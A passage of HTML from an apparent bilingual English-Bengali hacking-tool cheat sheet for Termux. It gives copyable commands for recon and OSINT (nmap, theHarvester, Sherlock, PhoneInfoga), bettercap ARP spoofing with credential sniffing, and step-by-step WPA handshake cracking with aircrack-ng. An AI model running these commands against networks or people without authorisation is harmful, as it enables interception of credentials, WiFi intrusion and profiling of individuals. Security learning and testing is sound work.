+            <div class="cmd-code"><span class="cb">nmap</span> <span class="cf">--script vuln</span> <span class="ca">target.com</span></div>
+            <div class="cmd-note en">Run vulnerability detection scripts on target</div>
+            <div class="cmd-note bn">টার্গেটে ভালনারেবিলিটি স্ক্রিপ্ট চালান</div>
+          </div><button class="cpbtn" onclick="cp(this,'nmap --script vuln target.com')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">nmap</span> <span class="cf">-sn</span> <span class="ca">192.168.1.0/24</span></div>
+            <div class="cmd-note en">Ping sweep — discover all live hosts on network</div>
+            <div class="cmd-note bn">পিং সুইপ — নেটওয়ার্কের সব লাইভ হোস্ট খুঁজুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'nmap -sn 192.168.1.0/24')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- WHOIS -->
+      <div class="card" data-cat="recon" data-kw="whois domain ip lookup registration">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a1a;border:1px solid var(--cyan);">🔍</div>
+          <div class="tool-meta">
+            <div class="tool-name">Whois</div>
+            <div class="tool-desc en">Domain registration info — owner, registrar, dates, IPs</div>
+            <div class="tool-desc bn">ডোমেইন রেজিস্ট্রেশন তথ্য — মালিক, রেজিস্ট্রার, তারিখ, IP</div>
+          </div>
+          <span class="badge b-recon">RECON</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Whois</div>
+          <div class="feat-title bn">✦ Whois দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Domain Owner Info</span><span class="feat bn">ডোমেইন মালিক তথ্য</span>
+            <span class="feat en">Registrar Details</span><span class="feat bn">রেজিস্ট্রার বিবরণ</span>
+            <span class="feat en">Expiry Date</span><span class="feat bn">মেয়াদ শেষের তারিখ</span>
+            <span class="feat en">IP WHOIS Lookup</span><span class="feat bn">IP WHOIS লুকআপ</span>
+            <span class="feat en">Nameserver Info</span><span class="feat bn">নেমসার্ভার তথ্য</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">whois</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install whois')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">whois</span> <span class="ca">google.com</span></div>
+            <div class="cmd-note en">Get full domain registration info</div>
+            <div class="cmd-note bn">ডোমেইনের সম্পূর্ণ রেজিস্ট্রেশন তথ্য পান</div>
+          </div><button class="cpbtn" onclick="cp(this,'whois google.com')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">whois</span> <span class="ca">8.8.8.8</span></div>
+            <div class="cmd-note en">Get owner & location info of an IP address</div>
+            <div class="cmd-note bn">IP অ্যাড্রেসের মালিক ও লোকেশন তথ্য পান</div>
+          </div><button class="cpbtn" onclick="cp(this,'whois 8.8.8.8')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">whois</span> <span class="ca">target.com</span> | grep -i <span class="cs">"name\|email\|phone"</span></div>
+            <div class="cmd-note en">Filter contact details from whois output</div>
+            <div class="cmd-note bn">Whois আউটপুট থেকে কন্ট্যাক্ট ডিটেইলস ফিল্টার করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'whois target.com | grep -i \"name\\|email\\|phone\"')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- THEHARVESTER -->
+      <div class="card" data-cat="recon" data-kw="theharvester email subdomain osint harvest">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a2a;border:1px solid var(--cyan);">🌾</div>
+          <div class="tool-meta">
+            <div class="tool-name">theHarvester</div>
+            <div class="tool-desc en">Harvest emails, subdomains & IPs from public sources</div>
+            <div class="tool-desc bn">পাবলিক সোর্স থেকে ইমেইল, সাবডোমেইন ও IP সংগ্রহ</div>
+          </div>
+          <span class="badge b-recon">RECON</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with theHarvester</div>
+          <div class="feat-title bn">✦ theHarvester দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Email Harvesting</span><span class="feat bn">ইমেইল সংগ্রহ</span>
+            <span class="feat en">Subdomain Enum</span><span class="feat bn">সাবডোমেইন খোঁজা</span>
+            <span class="feat en">Google/Bing Search</span><span class="feat bn">সার্চ ইঞ্জিন স্ক্যান</span>
+            <span class="feat en">LinkedIn People</span><span class="feat bn">LinkedIn তথ্য</span>
+            <span class="feat en">IP Discovery</span><span class="feat bn">IP আবিষ্কার</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/laramies/theHarvester && cd theHarvester && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/laramies/theHarvester && cd theHarvester && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> theHarvester.py <span class="cf">-d</span> <span class="ca">target.com</span> <span class="cf">-b</span> google</div>
+            <div class="cmd-note en">Harvest emails/subdomains from Google for target.com</div>
+            <div class="cmd-note bn">Google থেকে target.com-এর ইমেইল ও সাবডোমেইন সংগ্রহ</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 theHarvester.py -d target.com -b google')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> theHarvester.py <span class="cf">-d</span> <span class="ca">target.com</span> <span class="cf">-b all -l 500</span></div>
+            <div class="cmd-note en">Search ALL sources — maximum info gathering (500 results)</div>
+            <div class="cmd-note bn">সব সোর্স থেকে সর্বোচ্চ তথ্য সংগ্রহ (৫০০ রেজাল্ট)</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 theHarvester.py -d target.com -b all -l 500')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- RECON-NG -->
+      <div class="card" data-cat="recon" data-kw="recon-ng framework modules osint reconnaissance">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a2a;border:1px solid var(--cyan);">🕸️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Recon-ng</div>
+            <div class="tool-desc en">Full-featured web recon framework with 100+ modules</div>
+            <div class="tool-desc bn">১০০+ মডিউল সহ সম্পূর্ণ ওয়েব রিকন ফ্রেমওয়ার্ক</div>
+          </div>
+          <span class="badge b-recon">RECON</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Recon-ng</div>
+          <div class="feat-title bn">✦ Recon-ng দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Domain Recon</span><span class="feat bn">ডোমেইন রিকন</span>
+            <span class="feat en">Contact Harvesting</span><span class="feat bn">কন্ট্যাক্ট সংগ্রহ</span>
+            <span class="feat en">100+ Modules</span><span class="feat bn">১০০+ মডিউল</span>
+            <span class="feat en">Database Storage</span><span class="feat bn">ডেটাবেস স্টোরেজ</span>
+            <span class="feat en">Report Generation</span><span class="feat bn">রিপোর্ট তৈরি</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install recon-ng</code>
+          <button class="cpbtn" onclick="cp(this,'pip install recon-ng')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">recon-ng</span></div>
+            <div class="cmd-note en">Launch the Recon-ng interactive console</div>
+            <div class="cmd-note bn">Recon-ng ইন্টারেক্টিভ কনসোল চালু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'recon-ng')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">[recon-ng]&gt; <span class="cb">marketplace install all</span></div>
+            <div class="cmd-note en">Install all available modules</div>
+            <div class="cmd-note bn">সব মডিউল ইন্সটল করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'marketplace install all')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">[recon-ng]&gt; <span class="cb">use recon/domains-hosts/hackertarget</span></div>
+            <div class="cmd-note en">Load a subdomain discovery module</div>
+            <div class="cmd-note bn">সাবডোমেইন আবিষ্কার মডিউল লোড করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'use recon/domains-hosts/hackertarget')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">[recon-ng]&gt; <span class="cb">set SOURCE</span> <span class="ca">target.com</span> && <span class="cb">run</span></div>
+            <div class="cmd-note en">Set target and run the loaded module</div>
+            <div class="cmd-note bn">টার্গেট সেট করে মডিউল চালান</div>
+          </div><button class="cpbtn" onclick="cp(this,'set SOURCE target.com')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- SHERLOCK -->
+      <div class="card" data-cat="recon osint" data-kw="sherlock username social media hunt">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#100a1a;border:1px solid var(--purple);">🔎</div>
+          <div class="tool-meta">
+            <div class="tool-name">Sherlock</div>
+            <div class="tool-desc en">Hunt usernames across 300+ social networks instantly</div>
+            <div class="tool-desc bn">৩০০+ সোশ্যাল নেটওয়ার্কে ইউজারনেম তাৎক্ষণিকভাবে খুঁজুন</div>
+          </div>
+          <span class="badge b-osint">OSINT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Sherlock</div>
+          <div class="feat-title bn">✦ Sherlock দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Username Search</span><span class="feat bn">ইউজারনেম খোঁজা</span>
+            <span class="feat en">300+ Platforms</span><span class="feat bn">৩০০+ প্ল্যাটফর্ম</span>
+            <span class="feat en">Instagram/Twitter</span><span class="feat bn">সোশ্যাল মিডিয়া</span>
+            <span class="feat en">Export to CSV/TXT</span><span class="feat bn">CSV/TXT এক্সপোর্ট</span>
+            <span class="feat en">Proxy Support</span><span class="feat bn">প্রক্সি সাপোর্ট</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> sherlock.py <span class="ca">username</span></div>
+            <div class="cmd-note en">Find all social media accounts with this username</div>
+            <div class="cmd-note bn">এই ইউজারনেমের সব সোশ্যাল মিডিয়া অ্যাকাউন্ট খুঁজুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 sherlock.py username')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> sherlock.py <span class="ca">user1 user2 user3</span> <span class="cf">--timeout 10</span></div>
+            <div class="cmd-note en">Search multiple usernames at once with 10s timeout</div>
+            <div class="cmd-note bn">একসাথে একাধিক ইউজারনেম খুঁজুন ১০ সেকেন্ড টাইমআউটে</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 sherlock.py user1 user2 user3 --timeout 10')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- PHONEINFOGA -->
+      <div class="card" data-cat="recon osint" data-kw="phoneinfoga phone number lookup osint carrier">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#100a1a;border:1px solid var(--purple);">📞</div>
+          <div class="tool-meta">
+            <div class="tool-name">PhoneInfoga</div>
+            <div class="tool-desc en">Advanced phone number OSINT — carrier, location, web search</div>
+            <div class="tool-desc bn">ফোন নম্বর OSINT — ক্যারিয়ার, লোকেশন, ওয়েব সার্চ</div>
+          </div>
+          <span class="badge b-osint">OSINT</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with PhoneInfoga</div>
+          <div class="feat-title bn">✦ PhoneInfoga দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Carrier Info</span><span class="feat bn">ক্যারিয়ার তথ্য</span>
+            <span class="feat en">Country/Region</span><span class="feat bn">দেশ/অঞ্চল</span>
+            <span class="feat en">Number Format</span><span class="feat bn">নম্বর ফরম্যাট</span>
+            <span class="feat en">Web Search</span><span class="feat bn">ওয়েব সার্চ</span>
+            <span class="feat en">Web GUI</span><span class="feat bn">ওয়েব ইন্টারফেস</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>git clone https://github.com/sundowndev/phoneinfoga && cd phoneinfoga && pip install -r requirements.txt</code>
+          <button class="cpbtn" onclick="cp(this,'git clone https://github.com/sundowndev/phoneinfoga && cd phoneinfoga && pip install -r requirements.txt')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> phoneinfoga.py <span class="cf">scan -n</span> <span class="ca">+8801XXXXXXXXX</span></div>
+            <div class="cmd-note en">Scan a phone number — country code needed (+880 = BD)</div>
+            <div class="cmd-note bn">ফোন নম্বর স্ক্যান — কান্ট্রি কোড দিতে হবে (+880 = BD)</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 phoneinfoga.py scan -n +8801XXXXXXXXX')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> phoneinfoga.py serve <span class="cf">-p</span> <span class="ca">8080</span></div>
+            <div class="cmd-note en">Start web GUI dashboard on port 8080</div>
+            <div class="cmd-note bn">পোর্ট 8080-এ ওয়েব GUI ড্যাশবোর্ড চালু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 phoneinfoga.py serve -p 8080')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       2. NETWORK TESTING
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="network">
+    <div class="sec-head">
+      <div class="sec-icon">📡</div>
+      <div>
+        <div class="sec-title en">Network Testing</div>
+        <div class="sec-title bn">নেটওয়ার্ক টেস্টিং</div>
+        <div class="sec-sub en">Capture, analyze & intercept network traffic</div>
+        <div class="sec-sub bn">নেটওয়ার্ক ট্র্যাফিক ক্যাপচার, বিশ্লেষণ ও ইন্টারসেপ্ট</div>
+      </div>
+      <div class="sec-count">5 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- WIRESHARK (tshark) -->
+      <div class="card" data-cat="network" data-kw="wireshark tshark packet capture analysis">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#00102a;border:1px solid var(--blue);">🦈</div>
+          <div class="tool-meta">
+            <div class="tool-name">Wireshark / tshark</div>
+            <div class="tool-desc en">Deep packet inspection & network protocol analyzer</div>
+            <div class="tool-desc bn">ডিপ প্যাকেট ইন্সপেকশন ও নেটওয়ার্ক প্রোটোকল বিশ্লেষক</div>
+          </div>
+          <span class="badge b-net">NETWORK</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Wireshark/tshark</div>
+          <div class="feat-title bn">✦ Wireshark/tshark দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Live Packet Capture</span><span class="feat bn">লাইভ প্যাকেট ক্যাপচার</span>
+            <span class="feat en">Protocol Decode</span><span class="feat bn">প্রোটোকল ডিকোড</span>
+            <span class="feat en">HTTP/DNS Sniff</span><span class="feat bn">HTTP/DNS স্নিফ</span>
+            <span class="feat en">Save .pcap Files</span><span class="feat bn">.pcap ফাইল সেভ</span>
+            <span class="feat en">Traffic Filter</span><span class="feat bn">ট্র্যাফিক ফিল্টার</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">wireshark-cli</span> &nbsp;# tshark = CLI version</code>
+          <button class="cpbtn" onclick="cp(this,'pkg install wireshark-cli')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">tshark</span> <span class="cf">-i wlan0</span></div>
+            <div class="cmd-note en">Live capture on WiFi interface (wlan0)</div>
+            <div class="cmd-note bn">WiFi ইন্টারফেসে লাইভ ক্যাপচার করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'tshark -i wlan0')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">tshark</span> <span class="cf">-i wlan0 -w</span> <span class="ca">capture.pcap</span></div>
+            <div class="cmd-note en">Capture and save to file for later analysis</div>
+            <div class="cmd-note bn">ক্যাপচার করে পরে বিশ্লেষণের জন্য ফাইলে সেভ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'tshark -i wlan0 -w capture.pcap')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">tshark</span> <span class="cf">-i wlan0 -f</span> <span class="cs">"port 80"</span> <span class="cf">-Y</span> <span class="cs">"http"</span></div>
+            <div class="cmd-note en">Capture & display only HTTP traffic</div>
+            <div class="cmd-note bn">শুধু HTTP ট্র্যাফিক ক্যাপচার ও দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'tshark -i wlan0 -f \"port 80\" -Y \"http\"')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- TCPDUMP -->
+      <div class="card" data-cat="network" data-kw="tcpdump packet capture lightweight">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#00102a;border:1px solid var(--blue);">📦</div>
+          <div class="tool-meta">
+            <div class="tool-name">Tcpdump</div>
+            <div class="tool-desc en">Lightweight command-line packet sniffer & analyzer</div>
+            <div class="tool-desc bn">হালকা কমান্ড-লাইন প্যাকেট স্নিফার ও বিশ্লেষক</div>
+          </div>
+          <span class="badge b-net">NETWORK</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Tcpdump</div>
+          <div class="feat-title bn">✦ Tcpdump দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Packet Capture</span><span class="feat bn">প্যাকেট ক্যাপচার</span>
+            <span class="feat en">Protocol Filter</span><span class="feat bn">প্রোটোকল ফিল্টার</span>
+            <span class="feat en">Save to .pcap</span><span class="feat bn">.pcap-এ সেভ</span>
+            <span class="feat en">IP/Port Filter</span><span class="feat bn">IP/পোর্ট ফিল্টার</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">tcpdump</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install tcpdump')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">tcpdump</span> <span class="cf">-i wlan0 -v</span></div>
+            <div class="cmd-note en">Verbose packet capture on wlan0</div>
+            <div class="cmd-note bn">wlan0-এ ভার্বোস প্যাকেট ক্যাপচার করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'tcpdump -i wlan0 -v')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">tcpdump</span> <span class="cf">-i wlan0 port</span> <span class="ca">80</span> <span class="cf">-w</span> http.pcap</div>
+            <div class="cmd-note en">Capture HTTP traffic and save to file</div>
+            <div class="cmd-note bn">HTTP ট্র্যাফিক ক্যাপচার করে ফাইলে সেভ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'tcpdump -i wlan0 port 80 -w http.pcap')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">tcpdump</span> <span class="cf">-i wlan0 -A port</span> <span class="ca">80</span></div>
+            <div class="cmd-note en">Show packet contents in ASCII (see HTTP data)</div>
+            <div class="cmd-note bn">প্যাকেট কন্টেন্ট ASCII-তে দেখুন (HTTP ডেটা দেখুন)</div>
+          </div><button class="cpbtn" onclick="cp(this,'tcpdump -i wlan0 -A port 80')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- BETTERCAP -->
+      <div class="card" data-cat="network" data-kw="bettercap mitm arp spoof network">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#00102a;border:1px solid var(--blue);">🎯</div>
+          <div class="tool-meta">
+            <div class="tool-name">Bettercap</div>
+            <div class="tool-desc en">MITM attacks, ARP spoofing, DNS spoofing & sniffing</div>
+            <div class="tool-desc bn">MITM আক্রমণ, ARP স্পুফিং, DNS স্পুফিং ও স্নিফিং</div>
+          </div>
+          <span class="badge b-net">NETWORK</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Bettercap</div>
+          <div class="feat-title bn">✦ Bettercap দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">ARP Spoofing</span><span class="feat bn">ARP স্পুফিং</span>
+            <span class="feat en">Man-in-the-Middle</span><span class="feat bn">MITM আক্রমণ</span>
+            <span class="feat en">HTTP/S Sniffing</span><span class="feat bn">HTTP/S স্নিফিং</span>
+            <span class="feat en">DNS Spoofing</span><span class="feat bn">DNS স্পুফিং</span>
+            <span class="feat en">WiFi Recon</span><span class="feat bn">WiFi রিকন</span>
+            <span class="feat en">Web UI</span><span class="feat bn">ওয়েব ইন্টারফেস</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">bettercap</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install bettercap')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">bettercap</span> <span class="cf">-iface</span> <span class="ca">wlan0</span></div>
+            <div class="cmd-note en">Start bettercap on WiFi interface</div>
+            <div class="cmd-note bn">WiFi ইন্টারফেসে bettercap শুরু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'bettercap -iface wlan0')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">bettercap&gt; <span class="cb">net.probe on</span></div>
+            <div class="cmd-note en">Discover all hosts on current network</div>
+            <div class="cmd-note bn">নেটওয়ার্কের সব হোস্ট আবিষ্কার করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'net.probe on')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">bettercap&gt; <span class="cb">arp.spoof on</span></div>
+            <div class="cmd-note en">Enable ARP spoofing (MITM position)</div>
+            <div class="cmd-note bn">ARP স্পুফিং চালু করুন (MITM পজিশন নিন)</div>
+          </div><button class="cpbtn" onclick="cp(this,'arp.spoof on')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">bettercap&gt; <span class="cb">net.sniff on</span></div>
+            <div class="cmd-note en">Start sniffing credentials & traffic</div>
+            <div class="cmd-note bn">ক্রেডেনশিয়াল ও ট্র্যাফিক স্নিফিং শুরু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'net.sniff on')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- AIRCRACK-NG -->
+      <div class="card" data-cat="network" data-kw="aircrack wifi wpa wep wireless handshake crack">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#00102a;border:1px solid var(--blue);">📶</div>
+          <div class="tool-meta">
+            <div class="tool-name">Aircrack-ng Suite</div>
+            <div class="tool-desc en">Complete WiFi security auditing toolkit — WPA/WEP testing</div>
+            <div class="tool-desc bn">সম্পূর্ণ WiFi নিরাপত্তা অডিটিং টুলকিট — WPA/WEP টেস্টিং</div>
+          </div>
+          <span class="badge b-net">NETWORK</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Aircrack-ng</div>
+          <div class="feat-title bn">✦ Aircrack-ng দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Monitor Mode</span><span class="feat bn">মনিটর মোড</span>
+            <span class="feat en">WPA Handshake Capture</span><span class="feat bn">WPA হ্যান্ডশেক ক্যাপচার</span>
+            <span class="feat en">WEP Cracking</span><span class="feat bn">WEP ক্র্যাকিং</span>
+            <span class="feat en">Deauth Attack</span><span class="feat bn">ডিঅথেন্টিকেশন আক্রমণ</span>
+            <span class="feat en">WPA Dictionary Crack</span><span class="feat bn">WPA ডিকশনারি ক্র্যাক</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">aircrack-ng</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install aircrack-ng')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">STEP BY STEP</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">airmon-ng</span> start <span class="ca">wlan0</span></div>
+            <div class="cmd-note en">Step 1: Enable monitor mode on WiFi adapter → creates wlan0mon</div>
+            <div class="cmd-note bn">ধাপ ১: WiFi-তে মনিটর মোড চালু করুন → wlan0mon তৈরি হবে</div>
+          </div><button class="cpbtn" onclick="cp(this,'airmon-ng start wlan0')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">airodump-ng</span> <span class="ca">wlan0mon</span></div>
+            <div class="cmd-note en">Step 2: Scan & list all nearby WiFi networks</div>
+            <div class="cmd-note bn">ধাপ ২: কাছের সব WiFi নেটওয়ার্ক স্ক্যান ও তালিকা দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'airodump-ng wlan0mon')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">airodump-ng</span> <span class="cf">-c</span> 6 <span class="cf">--bssid</span> <span class="ca">XX:XX:XX:XX:XX:XX</span> <span class="cf">-w</span> capture <span class="ca">wlan0mon</span></div>
+            <div class="cmd-note en">Step 3: Capture handshake from target network (channel 6)</div>
+            <div class="cmd-note bn">ধাপ ৩: টার্গেট নেটওয়ার্ক থেকে হ্যান্ডশেক ক্যাপচার (চ্যানেল ৬)</div>
+          </div><button class="cpbtn" onclick="cp(this,'airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">aircrack-ng</span> <span class="cf">-w</span> wordlist.txt <span class="ca">capture-01.cap</span></div>
+            <div class="cmd-note en">Step 4: Crack WPA password from captured handshake</div>
+            <div class="cmd-note bn">ধাপ ৪: ক্যাপচার করা হ্যান্ডশেক থেকে WPA পাসওয়ার্ড ক্র্যাক</div>
+          </div><button class="cpbtn" onclick="cp(this,'aircrack-ng -w wordlist.txt capture-01.cap')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- KISMET -->
+      <div class="card" data-cat="network" data-kw="kismet wifi wireless passive detection sniffer">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#00102a;border:1px solid var(--blue);">🛰️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Kismet</div>
+            <div class="tool-desc en">Passive WiFi/Bluetooth network detector & IDS</div>
+            <div class="tool-desc bn">প্যাসিভ WiFi/Bluetooth নেটওয়ার্ক ডিটেক্টর ও IDS</div>
+          </div>
+          <span class="badge b-net">NETWORK</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Kismet</div>
+          <div class="feat-title bn">✦ Kismet দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Hidden SSID Find</span><span class="feat bn">লুকানো SSID খোঁজা</span>
+            <span class="feat en">Device Tracking</span><span class="feat bn">ডিভাইস ট্র্যাকিং</span>
+            <span class="feat en">Web Dashboard</span><span class="feat bn">ওয়েব ড্যাশবোর্ড</span>
+            <span class="feat en">Passive Detection</span><span class="feat bn">প্যাসিভ ডিটেকশন</span>
+            <span class="feat en">GPS Logging</span><span class="feat bn">GPS লগিং</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">kismet</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install kismet')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">kismet</span> <span class="cf">-c</span> <span class="ca">wlan0</span></div>
+            <div class="cmd-note en">Start Kismet — open browser at http://localhost:2501</div>
+            <div class="cmd-note bn">Kismet শুরু করুন — ব্রাউজারে http://localhost:2501 খুলুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'kismet -c wlan0')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">kismet</span> <span class="cf">-c</span> <span class="ca">wlan0</span> <span class="cf">--no-ncurses</span></div>
+            <div class="cmd-note en">Run Kismet in background (web UI only)</div>
+            <div class="cmd-note bn">Kismet ব্যাকগ্রাউন্ডে চালান (শুধু ওয়েব UI)</div>
+          </div><button class="cpbtn" onclick="cp(this,'kismet -c wlan0 --no-ncurses')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       3. WEB SECURITY TESTING
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="web">
+    <div class="sec-head">
+      <div class="sec-icon">🌐</div>
+      <div>
+        <div class="sec-title en">Web Security Testing</div>
